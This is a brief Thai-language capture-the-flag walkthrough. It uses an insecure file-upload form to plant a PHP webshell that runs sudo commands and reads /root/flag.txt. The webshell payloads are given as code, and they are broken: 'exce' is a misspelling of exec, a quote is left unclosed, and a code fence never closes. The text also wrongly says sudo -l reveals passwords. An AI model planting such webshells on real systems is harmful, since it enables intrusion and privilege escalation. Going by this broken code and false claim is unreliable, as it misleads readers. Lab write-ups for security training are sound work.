## 🎯 เป้าหมาย
หาค่า `flag.txt` ที่ซ่อนอยู่ในโฟลเดอร์ `/root` โดยอาศัยช่องโหว่การอัปโหลดรูปโปรไฟล์ที่ไม่ปลอดภัย

---

## 🔎 ขั้นตอนที่ 1 – สำรวจระบบ (Reconnaissance)
1. เปิดหน้าเว็บเป้าหมาย
2. พบฟอร์มอัปโหลดไฟล์:
   ```html
   <form action="upload.php" method="post" enctype="multipart/form-data">
       <input type="file" name="fileToUpload" id="fileToUpload"/>
   </form>

## ⚡ ขั้นตอนที่ 2 – สร้าง Payload
สร้างไฟล์ PHP webshell อย่างง่าย:
```
<?php exce("sudo -l"); ?>
```
เพื่อเช็คสิทธิและดูรหัสผ่าน

จากนั้นเขียน PHP webshell เป็น 
```
<?php exce("sudo cat /root/flag.txt); ?>
```
เพื่อนำค่า flag ออกมา
